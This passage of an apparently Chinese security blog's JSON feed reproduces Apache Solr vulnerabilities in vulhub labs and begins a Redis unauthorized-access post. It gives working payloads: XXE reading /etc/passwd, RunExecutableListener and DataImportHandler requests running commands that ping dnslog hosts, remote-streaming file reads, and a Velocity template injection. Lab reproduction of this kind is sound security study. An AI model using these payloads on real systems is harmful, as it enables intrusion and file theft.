class=\"keyword\">null</span> ) &#123;</span><br><span class=\"line\">          stream.setContentType( contentType );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        streams.add( stream );</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<p>在 <code>solr/solrj/src/java/org/apache/solr/common/params/CommonParams.java</code>  中，写明了 <code>stream.file</code>  即为传入的 <code>CommonParams.STREAM_FILE</code> <br>\n<img src=\":/24ec295b558e4aac8846e0ab3e142848\" alt=\"e0c12b5404c9aa9db8cd8eb2b87f7d3e.png\"><br>\n 其中若传入 url 可导致 ssrf，原理同上</p>\n<h3 id=\"修复建议\"><a class=\"markdownIt-Anchor\" href=\"#修复建议\">#</a> 修复建议</h3>\n<ol>\n<li>控制 solr 访问权限，增加访问口令</li>\n<li>不对外网开放 solr</li>\n<li>关闭 ConfigAPI：在 bin 目录下的 solr.in.cmd 中加入一行 set SOLR_OPTS=% SOLR_OPTS% -Ddisable.configEdit=true；然后关闭远程读取文件流，默认不开启</li>\n</ol>\n<h2 id=\"cve-2019-17558\"><a class=\"markdownIt-Anchor\" href=\"#cve-2019-17558\">#</a> CVE-2019-17558</h2>\n<p>传送门：<br>\n<a href=\"https://www.pianshen.com/article/23101236137/\">本地部署 idea 调试环境</a><br>\n<a href=\"https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ\"> Apache Solr 组件安全</a><br>\n<a href=\"http://rui0.cn/archives/993\"> XXE 漏洞原理以及防御方式</a><br>\n<a href=\"https://blog.csdn.net/whatday/article/details/106959989/\"> apache solr 远程代码执行漏洞 (cve-2019-0193)</a><br>\n<a href=\"https://solr.apache.org/guide/6_6/config-api.html\">config API</a><br>\n<a href=\"https://solr.apache.org/guide/8_1/uploading-structured-data-store-data-with-the-data-import-handler.html#dih-concepts-and-terminology\">DHI</a><br>\n<a href=\"https://solr.apache.org/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html#the-scripttransformer\">script</a><br>\n<a href=\"https://solr.apache.org/security.html\">solr 历史漏洞</a><br>\n<a href=\"https://solr.apache.org/guide/6_6/content-streams.html\"> content-streams</a></p>\n<p>Copyright ©milkii0</p>\n",
            "tags": [
                "solr, 代码审计"
            ]
        },
        {
            "id": "http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "solr漏洞复现",
            "date_published": "2022-06-10T01:10:46.000Z",
            "content_html": "<h1 id=\"solr是什么\"><a class=\"markdownIt-Anchor\" href=\"#solr是什么\">#</a> solr 是什么</h1>\n<p>Solr 是开源的，基于 Lucene Java 的搜索服务器。</p>\n<p>易于加入到 Web 应用程序中，会生成基于 HTTP 的管理界面。<br>\n后台管理界面 Dashboard 仪表盘中，可查看当前 Solr 的版本信息。<br>\n(概念详解，移步传送门)</p>\n<h1 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h1>\n<p>漏洞复现环境均使用 vulhub 中的环境</p>\n<h1 id=\"cve-2017-12629-xxe\"><a class=\"markdownIt-Anchor\" href=\"#cve-2017-12629-xxe\">#</a> CVE-2017-12629-XXE</h1>\n<h2 id=\"影响版本\"><a class=\"markdownIt-Anchor\" href=\"#影响版本\">#</a> 影响版本</h2>\n<p>Apache Solr &lt; 7.1<br>\nApache Lucene &lt; 7.1</p>\n<h2 id=\"复现过程\"><a class=\"markdownIt-Anchor\" href=\"#复现过程\">#</a> 复现过程</h2>\n<p>启动环境后打开管理界面：<a href=\"http://192.168.77.128:8983/solr/#/\">http://192.168.77.128:8983/solr/#/</a><br>\nsolr-spec 版本：7.0.1，lucene-spec 版本：7.0.1，符合漏洞要求</p>\n<p><img src=\"bd2a3461fc7bccc9854dd362e359e6c9.png\" alt=\"bd2a3461fc7bccc9854dd362e359e6c9.png\"></p>\n<h3 id=\"利用外部实体读取敏感文件信息\"><a class=\"markdownIt-Anchor\" href=\"#利用外部实体读取敏感文件信息\">#</a> 利用外部实体读取敏感文件信息</h3>\n<ol>\n<li>开一个 web 服务，在下面创建一个 1.dtd 文件，文件内容如下</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">ent</span> <span class=\"meta-string\">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>读取 Linux 下 /etc/passwd 文件信息<br>\n引用外部实体<br>\n payload： <code>http://192.168.77.128:8983/solr/demo/select?&amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.77.128%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;wt=xml&amp;defType=xmlparser</code> <br>\nURL 解码后：<br>\n <code>http://192.168.77.128:8983/solr/demo/select?&amp;q=&lt;?xml+version=&quot;1.0&quot;+?&gt;&lt;!DOCTYPE+root[&lt;!ENTITY+%+ext+SYSTEM+&quot;http://192.168.77.128/1.dtd&quot;&gt;%ext;%ent;]&gt;&lt;r&gt;&amp;data;&lt;/r&gt;&amp;wt=xml&amp;defType=xmlparser</code> <br>\n 执行 payload，获取文件信息成功<br>\n<img src=\"../_resources/7053300facb7c69236631c1d082a1013.png\" alt=\"7053300facb7c69236631c1d082a1013.png\"></li>\n</ol>\n<h3 id=\"本地dtd读取文件\"><a class=\"markdownIt-Anchor\" href=\"#本地dtd读取文件\">#</a> 本地 DTD 读取文件</h3>\n<p><a href=\"https://zhuanlan.zhihu.com/p/83713259\">XXE 之利用本地 DTD 进行文件读取</a></p>\n<h1 id=\"cve-2017-12629-rce\"><a class=\"markdownIt-Anchor\" href=\"#cve-2017-12629-rce\">#</a> CVE-2017-12629-RCE</h1>\n<h2 id=\"影响版本-2\"><a class=\"markdownIt-Anchor\" href=\"#影响版本-2\">#</a> 影响版本</h2>\n<p>Apache Solr &lt; 7.1<br>\nApache Lucene &lt; 7.1</p>\n<h2 id=\"复现过程-2\"><a class=\"markdownIt-Anchor\" href=\"#复现过程-2\">#</a> 复现过程</h2>\n<p>触发命令执行的事件有两种：postCommit 和 newSearcher</p>\n<h3 id=\"使用newsearcher\"><a class=\"markdownIt-Anchor\" href=\"#使用newsearcher\">#</a> 使用 newSearcher</h3>\n<p>其中 demo 为存在的 core 名称<br>\n数据包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /solr/demo/config HTTP/1.1</span><br><span class=\"line\">Host: 192.168.77.128:8983</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 178</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&quot;add-listener&quot; : &#123;</span><br><span class=\"line\">&quot;event&quot;:&quot;newSearcher&quot;,</span><br><span class=\"line\">&quot;name&quot;:&quot;newlistener1&quot;,</span><br><span class=\"line\">&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class=\"line\">&quot;exe&quot;:&quot;ping&quot;,</span><br><span class=\"line\">&quot;dir&quot;:&quot;/usr/bin/&quot;,</span><br><span class=\"line\">&quot;args&quot;:[&quot;3pqsrm.dnslog.cn&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"94b6a5f1b4ac9063e66287dcb8c4a904.png\" alt=\"94b6a5f1b4ac9063e66287dcb8c4a904.png\"><br>\n<img src=\"1ad6af042c22a35b1a3f512ecdded65b.png\" alt=\"1ad6af042c22a35b1a3f512ecdded65b.png\"></p>\n<h3 id=\"使用postcommit\"><a class=\"markdownIt-Anchor\" href=\"#使用postcommit\">#</a> 使用 postCommit</h3>\n<p>数据包 1：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /solr/demo/config HTTP/1.1</span><br><span class=\"line\">Host: 192.168.77.128:8983</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 177</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&quot;add-listener&quot; : &#123;</span><br><span class=\"line\">&quot;event&quot;:&quot;postCommit&quot;,</span><br><span class=\"line\">&quot;name&quot;:&quot;newlistener3&quot;,</span><br><span class=\"line\">&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class=\"line\">&quot;exe&quot;:&quot;ping&quot;,</span><br><span class=\"line\">&quot;dir&quot;:&quot;/usr/bin/&quot;,</span><br><span class=\"line\">&quot;args&quot;:[&quot;3pqsrm.dnslog.cn&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>发送该请求后一直没有返回数据，取消重发会回显该 name 已经存在，所以发送第二个数据包<br>\n<img src=\"2127408f02166332e7024113d04771c7.png\" alt=\"2127408f02166332e7024113d04771c7.png\"><br>\n 数据包 2 (数据随便输)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /solr/demo/update HTTP/1.1</span><br><span class=\"line\">Host: 192.168.77.128:8983</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 17</span><br><span class=\"line\"></span><br><span class=\"line\">[&#123;&quot;id&quot;:&quot;test&quot;</span><br><span class=\"line\">&#125;]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"fd55bbc422425d1cc140a4b9c47bb275.png\" alt=\"fd55bbc422425d1cc140a4b9c47bb275.png\"><br>\n 更新后发现两条记录都在（之前因为没有返回数据又试了一次）<br>\n<img src=\"87bd83e9378424bd1f9371d9d213a4c8.png\" alt=\"87bd83e9378424bd1f9371d9d213a4c8.png\"></p>\n<h1 id=\"cve-2019-0193\"><a class=\"markdownIt-Anchor\" href=\"#cve-2019-0193\">#</a> CVE-2019-0193</h1>\n<h2 id=\"影响版本-3\"><a class=\"markdownIt-Anchor\" href=\"#影响版本-3\">#</a> 影响版本</h2>\n<p>Apache solr &lt; 8.2.0</p>\n<h2 id=\"复现过程-3\"><a class=\"markdownIt-Anchor\" href=\"#复现过程-3\">#</a> 复现过程</h2>\n<p>在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr &lt; 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制</p>\n<p>vulhub 环境下，进入后会让我们新建一个 core<br>\n<img src=\"ddc393bc282026e3dab3eda7d12be543.png\" alt=\"ddc393bc282026e3dab3eda7d12be543.png\"><br>\n 我们需要在服务器中新建，这里新建会报错找不到配置文件<br>\n新建 test core 命令<br>\n <code>docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db </code> <br>\n<img src=\"4408b56e4ba62cde34034ac2e758e594.png\" alt=\"4408b56e4ba62cde34034ac2e758e594.png\"><br>\n 刷新页面即可看见新建的 core<br>\n 根据以下步骤进行代码执行<br>\n<img src=\"f3b7b2eac45cbc2012a1e0645496bc1f.png\" alt=\"f3b7b2eac45cbc2012a1e0645496bc1f.png\"><br>\nexp：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dataConfig</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">dataSource</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;URLDataSource&quot;</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\">&lt;![CDATA[</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"handlebars\">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;ping 0ytihf.dnslog.cn&quot;);</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"handlebars\">          &#125;</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"handlebars\">  ]]&gt;</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">document</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">entity</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;stackoverflow&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">url</span>=<span class=\"string\">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">processor</span>=<span class=\"string\">&quot;XPathEntityProcessor&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">forEach</span>=<span class=\"string\">&quot;/feed&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">transformer</span>=<span class=\"string\">&quot;script:poc&quot;</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">document</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dataConfig</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>执行成功后，上方会出现绿色修勾勾<br>\n<img src=\"63a1299f3a6105014fe6ca0d077857d7.png\" alt=\"63a1299f3a6105014fe6ca0d077857d7.png\"><br>\n 命令执行成功<br>\n<img src=\"c7aa99cb57448a243367095f5b1cd1af.png\" alt=\"c7aa99cb57448a243367095f5b1cd1af.png\"></p>\n<h1 id=\"remote-streaming-fileread任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#remote-streaming-fileread任意文件读取\">#</a> Remote-Streaming-Fileread（任意文件读取）</h1>\n<h2 id=\"复现过程-4\"><a class=\"markdownIt-Anchor\" href=\"#复现过程-4\">#</a> 复现过程</h2>\n<ol>\n<li>获取 cores</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /solr/admin/cores?_=1637649371526&amp;show=schema&amp;wt=json HTTP/1.1</span><br><span class=\"line\">Host: 192.168.8.128:8983</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class=\"line\">Accept: application/json, text/plain, */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://192.168.8.128:8983/solr/</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>存在的 core 名为 demo<br>\n<img src=\"b07e466a79ac15b0597a2354b9a7f378.png\" alt=\"b07e466a79ac15b0597a2354b9a7f378.png\"></p>\n<ol start=\"2\">\n<li>修改 demo 的配置，开启 RemoteStreaming</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /solr/demo/config?_=1637649371526&amp;show=schema&amp;wt=json HTTP/1.1</span><br><span class=\"line\">Host: 192.168.8.128:8983</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class=\"line\">Accept: application/json, text/plain, */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://192.168.8.128:8983/solr/</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 82</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>当出现以下信息时，表示漏洞可能存在:<br>\nThis response format is experimental.  It is likely to change in the future<br>\n<img src=\"240c340be0b4a48321e3bfa01a8bdebd.png\" alt=\"240c340be0b4a48321e3bfa01a8bdebd.png\"><br>\n3. 读取敏感文件<br>\n数据包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd HTTP/1.1</span><br><span class=\"line\">Host: 192.168.8.128:8983</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class=\"line\">Accept: application/json, text/plain, */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://192.168.8.128:8983/solr/</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>读取成功<br>\n<img src=\"e6a8a0fa5ab5ce46c52d3877e991197b.png\" alt=\"e6a8a0fa5ab5ce46c52d3877e991197b.png\"></p>\n<h1 id=\"cve-2019-17558\"><a class=\"markdownIt-Anchor\" href=\"#cve-2019-17558\">#</a> CVE-2019-17558</h1>\n<h2 id=\"影响版本-4\"><a class=\"markdownIt-Anchor\" href=\"#影响版本-4\">#</a> 影响版本</h2>\n<p>5.0.0 &lt;=Apache Solr&lt;= 8.3.1</p>\n<h2 id=\"漏洞复现\"><a class=\"markdownIt-Anchor\" href=\"#漏洞复现\">#</a> 漏洞复现</h2>\n<p>用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令</p>\n<ol>\n<li>获取 core<br>\n 当前存在的 core 为 demo<br>\n<img src=\"e88cbca22f51a1d4843dbf5dd4fa5339.png\" alt=\"e88cbca22f51a1d4843dbf5dd4fa5339.png\"></li>\n<li>修改 demo 的配置，开启 params.resource.loader.enabled 配置<br>\n数据包：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /solr/demo/config?_=1637649371526&amp;show=schema&amp;wt=json HTTP/1.1</span><br><span class=\"line\">Host: 192.168.8.128:8983</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class=\"line\">Accept: application/json, text/plain, */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://192.168.8.128:8983/solr/</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 261</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class=\"line\">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class=\"line\">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class=\"line\">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class=\"line\">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class=\"line\">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class=\"line\">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\".8f730000e51cf9135817b1b634c260f7.png\" alt=\"8f730000e51cf9135817b1b634c260f7.png\"><br>\n3. Velocity 模板代码注入<br>\n数据包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class=\"line\">Host: 192.168.8.128:8983</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class=\"line\">Accept: application/json, text/plain, */*</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://192.168.8.128:8983/solr/</span><br><span class=\"line\">X-Requested-With: XMLHttpRequest</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>命令执行成功<br>\n<img src=\"f9466bd1a48ca275a93276b87fd78e46.png\" alt=\"f9466bd1a48ca275a93276b87fd78e46.png\"></p>\n<h1 id=\"传送门\"><a class=\"markdownIt-Anchor\" href=\"#传送门\">#</a> 传送门：</h1>\n<p><a href=\"https://zhuanlan.zhihu.com/p/374041499\">搜索引擎 Solr 介绍</a><br>\n<a href=\"https://segmentfault.com/a/1190000013822385\"> Lucene 就是这么简单</a><br>\n<a href=\"https://blog.csdn.net/whatday/article/details/106974271\"> cve-2017-12629 apache solr xxe &amp; rce 漏洞分析</a>（6）</p>\n<p>Copyright ©milkii0</p>\n",
            "tags": [
                "solr, 漏洞复现"
            ]
        },
        {
            "id": "http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/",
            "url": "http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/",
            "title": "redis未授权验证流程",
            "date_published": "2022-01-16T03:14:59.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"安装redis\"><a class=\"markdownIt-Anchor\" href=\"#安装redis\">#</a> 安装 redis</h1>\n<h1 id=\"登录redis\"><a class=\"markdownIt-Anchor\" href=\"#登录redis\">#</a> 登录 redis</h1>\n<p>redis-cli -h ip</p>\n<h1 id=\"redis未授权拿shell\"><a class=\"markdownIt-Anchor\" href=\"#redis未授权拿shell\">#</a> redis 未授权拿 shell</h1>\n<h2 id=\"ssh写公钥\"><a class=\"markdownIt-Anchor\" href=\"#ssh写公钥\">#</a> ssh 写公钥</h2>\n<h2 id=\"写计划任务\"><a class=\"markdownIt-Anchor\" href=\"#写计划任务\">#</a> 写计划任务</h2>\n<h1 id=\"修复建议需要更详细操作\"><a class=\"markdownIt-Anchor\" href=\"#修复建议需要更详细操作\">#</a> 修复建议【需要更详细操作】</h1>\n<p>到 redis 安装目录下，配置 redis.conf 文件：</p>\n<ol>\n<li>\n<p>限制访问 ip<br>\n 增加可访问 ip 白名单</p>\n</li>\n<li>\n<p>只允许本地访问<br>\n增加端口访问策略，bind 127.0.0.1</p>\n</li>\n<li>\n<p>添加登陆密码</p>\n</li>\n</ol>\n<blockquote>\n<blockquote>\n<p>修改 redis.conf 文件，添加<br>\n requirepass  mypasswd<br>\n3、在需要对外开放的时候修改默认端口（端口不重复就可以）<br>\nport 2344</p>\n</blockquote>\n</blockquote>\n<ol start=\"4\">\n<li>以低权限运行 Redis 服务<br>\n配置后需重启</li>\n</ol>\n<blockquote>\n<blockquote>\n<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>\n</blockquote>\n</blockquote>\n<h1 